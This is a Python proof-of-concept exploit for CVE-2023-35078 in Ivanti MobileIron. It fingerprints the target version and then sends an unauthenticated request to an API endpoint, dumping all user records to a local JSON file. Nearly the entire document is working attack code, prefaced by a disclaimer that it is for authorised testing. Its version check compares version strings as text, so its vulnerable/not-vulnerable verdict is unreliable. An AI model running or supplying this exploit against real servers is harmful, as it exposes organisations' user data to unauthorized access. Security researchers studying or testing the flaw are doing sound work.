# CVE-2023-35078 - Remote Unauthenticated API Access Vulnerability Exploit POC

import requests
import sys
import json
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    print("""
          
#########################################################
#                                                       #
#                   CVE-2023-35078                      #
#    Remote Unauthenticated API Access Vulnerability    #
#                    Exploit PoC                        #
#                                                       #
#########################################################

[+] Description:
This script demonstrates an ethical Proof of Concept (PoC) for CVE-2023-35078 - Remote Unauthenticated API Access Vulnerability
The vulnerability allows unauthorized access to sensitive data through an insecure API endpoint.
https://nvd.nist.gov/vuln/detail/CVE-2023-35078

[+] Disclaimer:
This script is for educational and ethical purposes only. It should only be used with explicit permission from the system owner and for legitimate security testing.

[+] Usage:
python cve_2023_35078_poc.py -u http://

[+] Author:
Vaishno Chaitanya (https://github.com/vchan-in)
""")

def check_ivanti_mobileiron_version(url):
    # Check if the target is vulnerable
    # Checking version from the HTML <link href="https://[target]/mifs/css/ui.login.css?11.2" rel="stylesheet" type="text/css" />
    
    # Get the HTML
    try:
        r = requests.get(url, verify=False)
        if r.status_code == 200:
            # Get the version from the HTML
            version = r.text.split("ui.login.css?")[1].split('"')[0]
            print(f"[*] Target version: {version}")
            if version <= "11.4":
                print("[+] Target is vulnerable!")
                return True
            else:
                print("[-] Target is not vulnerable!")
                sys.exit(0)
        else:
            print("[-] Target is not vulnerable!")
            sys.exit(0)
    except Exception as e:
        print(f"[-] Error occurred: {str(e)}")
        sys.exit(0)

def get_users(url):
    vuln_url = url + "/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1"
    print("[*] Exploiting the target...")
    print(f"[*] Dumping all users from {vuln_url}")
    try:
        r = requests.get(vuln_url, verify=False)
        if r.status_code == 200:
            print("[+] Extracting Data:")
            # Save JSON response to a file
            with open("users.json", "w") as f:
                f.write(r.text)
            print("[+] Data saved to users.json")
            print("[+] Vulnerability Exploited Successfully!")
        else:
            print("[-] Exploit failed. The target is not vulnerable.")
    except Exception as e:
        print(f"[-] Error occurred: {str(e)}")

def main():
    parser = argparse.ArgumentParser(description='CVE-2023-35078 - Remote Unauthenticated API Access Vulnerability Exploit POC')
    parser.add_argument('-u', '--url', help='URL to exploit', required=True)
    args = parser.parse_args()
    banner()
    is_vulnerable = check_ivanti_mobileiron_version(args.url)
    if is_vulnerable:
        get_users(args.url)

if __name__ == "__main__":
    main()
